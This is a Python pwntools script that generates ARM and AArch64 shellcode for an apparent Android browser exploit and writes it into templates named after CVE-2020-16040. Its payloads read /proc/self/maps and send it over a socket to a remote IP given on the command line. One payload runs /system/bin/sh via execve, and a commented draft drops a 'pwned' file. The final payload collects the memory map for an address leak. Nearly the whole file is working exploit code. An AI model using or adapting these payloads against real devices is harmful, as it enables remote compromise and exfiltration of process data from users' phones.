from pwn import *
import sys

# context.arch = 'aarch64'
context.arch = 'arm'

def bytes_to_js_array(data: bytes) -> str:
    return ', '.join(hex(n) for n in data)

def load_reg_64(reg: str, value: int) -> str:
    return f'''
movz {reg}, {value & 0xffff}, lsl #0
movk {reg}, {(value & 0xffff0000) >> 16}, lsl #16
movk {reg}, {(value & 0xffff00000000) >> 32}, lsl #32
movk {reg}, {(value & 0xffff000000000000) >> 48}, lsl #48
'''

def load_reg_32(reg: str, value: int) -> int:
    return f'''
    movw {reg}, {value & 0xffff}
    movt {reg}, {(value & 0xffff0000) >> 16}
    '''

def push_str_on_stack(data_str: str) -> str:
    data = data_str.encode() + b'\0'
    pad_len = 16 - (len(data) % 16)
    data = data.ljust(len(data) + pad_len, b'\0')

    out = ''
    for i in range(0, len(data), 16):
        n1 = u32(data[i:i+4])
        n2 = u32(data[i+4:i+8])
        n3 = u32(data[i+8:i+12])
        n4 = u32(data[i+12:i+16])

        out = f'''
sub sp, sp, #16
{load_reg_32('r0', n1)}
str r0, [sp, #0]
{load_reg_32('r0', n2)}
str r0, [sp, #4]
{load_reg_32('r0', n3)}
str r0, [sp, #8]
{load_reg_32('r0', n4)}
str r0, [sp, #12]
''' + out
    
    return out

def main():
    if len(sys.argv) != 2:
        print('Usage: gen_constants.py <remote_ip>')
        sys.exit(1)

    remote_ip_addr = sys.argv[1]
    parts = remote_ip_addr.split('.')
    assert len(parts) == 4

    ip_addr = sum(int(n) << (8 * i) for i, n in enumerate(reversed(parts)))
    print(hex(ip_addr))

    payload = f'''
    // Allocate a big stack buffer
    sub sp, sp, #0x4000         // Reserve 16KB
    mov x20, sp                 // x20 = buffer pointer

    {push_str_on_stack('/proc/self/maps')}

    // --- open("/proc/self/maps", O_RDONLY)
    mov x8, #56                 // sys_openat
    mov x0, xzr                 // AT_FDCWD
    mov x1, sp
    mov x2, #0                  // O_RDONLY
    svc #0
    mov x21, x0                 // Save fd

    // --- read(fd, buf, 0x4000)
    mov x0, x21                 // fd
    mov x1, x20                 // buf
    mov x2, #0x4000             // size
    mov x8, #63                 // sys_read
    svc #0
    mov x22, x0                 // Save read length

    // --- socket(AF_INET, SOCK_STREAM, 0)
    mov x0, #2                  // AF_INET
    mov x1, #1                  // SOCK_STREAM
    mov x2, #0                  // IPPROTO_IP
    mov x8, #198                // sys_socket
    svc #0
    mov x23, x0                 // Save socket fd

    // --- connect(fd, sockaddr, addrlen)
    // struct sockaddr_in {{
    //   sa_family=2, port=0x0539, addr=0x7f000001
    // }}
    sub sp, sp, #0x10
    mov x1, sp
    strh wzr, [x1, #0]          // zero init
    mov w0, #2                  // AF_INET
    strh w0, [x1]               // sa_family = AF_INET
    mov w0, #0x0539             // Port 1337 (network byte order)
    rev16 w0, w0
    strh w0, [x1, #2]           // sin_port

    // IP: 127.0.0.1 = 0x7f000001
    //mov w0, 0x7f000001
    {load_reg_64('x0', ip_addr)}
    rev w0, w0
    str w0, [x1, #4]            // sin_addr

    mov x0, x23                 // sockfd
    mov x2, #16                 // addrlen
    mov x8, #203                // sys_connect
    svc #0

    // --- send(sockfd, buf, len, 0)
    mov x0, x23                 // socket fd
    mov x1, x20                 // buffer
    mov x2, x22                 // length
    mov x3, #0                  // flags
    mov x4, #0
    mov x5, #0
    mov x8, #206                // sys_sendto (no sys_send on arm64)
    svc #0

    // --- exit(0)
    mov x0, #0
    mov x8, #93
    svc #0
    '''

    payload = f'''
    {push_str_on_stack('/proc/self/maps')}
    // --- Open "/proc/self/maps" ---
    mov r0, sp
    mov r1, #0               // O_RDONLY = 0
    mov r7, #5               // syscall number: SYS_open
    svc #0
    mov r8, r0               // Save fd of /proc/self/maps in r4

    // --- Allocate buffer on stack ---
    sub sp, sp, #4096        // Allocate 4KB
    mov r9, sp               // r5 = buffer

    // --- Read file into buffer ---
    mov r0, r8               // fd
    mov r1, r9               // buf
    mov r2, #4096            // count
    mov r7, #3               // syscall: read
    svc #0
    mov r10, r0               // r6 = number of bytes read

    // --- Create socket (AF_INET, SOCK_STREAM, 0) ---
    mov r0, #2               // AF_INET
    mov r1, #1               // SOCK_STREAM
    mov r2, #0               // Protocol
    mov r7, #281             // syscall: socket
    svc #0
    mov r11, r0               // socket fd in r4

    // --- Prepare sockaddr_in ---
    sub sp, sp, #0x10
    mov r1, sp
    mov r2, #2
    strh r2, [r1]
    mov r2, #1337
    rev16 r2, r2
    strh r2, [r1, #2]
    {load_reg_32('r2', ip_addr)}
    rev r2, r2
    str r2, [r1, #4]


    mov r2, #16              // addrlen = sizeof(struct sockaddr_in)
    mov r0, r11               // sockfd
    mov r7, #283             // syscall: connect
    svc #0

    // --- Send buffer over socket ---
    mov r0, r11               // socket fd
    mov r1, r9               // buffer pointer
    mov r2, r10               // number of bytes read
    mov r7, #4               // syscall: write
    svc #0

    // --- Exit ---
    mov r7, #1               // syscall: exit
    mov r0, #0
    svc #0
    '''

    page_offset_store_addr = 0x800

    exec_payload32 = f'''
    {push_str_on_stack('/system/bin/sh')}
    mov r0, sp
    {push_str_on_stack('-c')}
    mov r1, sp
    {push_str_on_stack('sleep 100')}
    mov r2, sp
    sub sp, sp, #0x10
    str r0, [sp]
    str r1, [sp, #4]
    str r2, [sp, #8]
    mov r3, 0
    str r3, [sp, #12]
    
    mov r1, sp
    mov r2, 0
    mov r7, #11
    svc #0
    '''

    map_len = 64 * 4096

    payload = f'''
    sub sp, sp, #0x10
    str r8, [sp]
    str r9, [sp, #4]
    str r10, [sp, #8]
    str r11, [sp, #12]
    mov r10, sp

    mov     r0, #0              @ addr = NULL
    mov     r1, #{map_len}      @ length = 8 pages (8 * 4096)
    mov     r2, #0x3            @ prot = PROT_READ | PROT_WRITE
    mov     r3, #0x22           @ flags = MAP_PRIVATE | MAP_ANONYMOUS

    mvn     r4, #0              @ fd = -1 (MVN = bitwise NOT)
    mov     r5, #0              @ offset = 0

    mov     r7, #192            @ syscall: mmap2
    svc     #0                  @ make syscall
    mov r8, r0

    {push_str_on_stack('/proc/self/maps')}
    // --- Open "/proc/self/maps" ---
    mov r0, sp
    mov r1, #0               // O_RDONLY = 0
    mov r7, #5               // syscall number: SYS_open
    svc #0

    mov r9, r0
    mov r11, #0

read_loop:
    mov r0, r9
    add r1, r8, r11          // read buffer

    mov r2, #{map_len}
    sub r2, r2, r11

    mov r7, #3               // read syscall
    svc #0

    mov r1, #0
    cmp r0, r1
    beq read_end

    // incrament read amount
    add r11, r11, r0
    b read_loop

read_end:

    // return pointer to mmap buffer
    mov r0, r8

    mov sp, r10
    ldr r8, [sp]
    ldr r9, [sp, #4]
    ldr r10, [sp, #8]
    ldr r11, [sp, #12]
    add sp, sp, #0x10
    bx lr
    '''

#     payload = f'''
# loop:
#     b loop
#     '''

    # payload = f'''
    # {push_str_on_stack('/system/bin/sh')}
    # mov x20, sp

    # {push_str_on_stack("-c")}
    # mov x21, sp

    # {push_str_on_stack('touch /sdcard/Download/pwned.txt')}
    # mov x22, sp

    # sub sp, sp, #0x20
    # str x20, [sp, #0]
    # str x21, [sp, #8]
    # str x22, [sp, #16]
    # str xzr, [sp, #24]

    # mov x0, x20
    # mov x1, sp
    # mov x2, xzr
    # mov x8, #221
    # svc #0
    # '''

    print(payload)

    payload = asm(payload)

    print(f'let shellcode = new Uint8Array({bytes_to_js_array(payload)});')

    for filename in ('CVE-2020-16040.html', 'shellcode_test.c'):
        parts = filename.split('.')
        with open(f'{parts[0]}_template.{parts[1]}', 'r') as f:
            data = f.read()
            new_data = data.replace('{{shellcode}}', bytes_to_js_array(payload))

        with open(filename, 'w') as f:
            f.write(new_data)

if __name__ == '__main__':
    main()
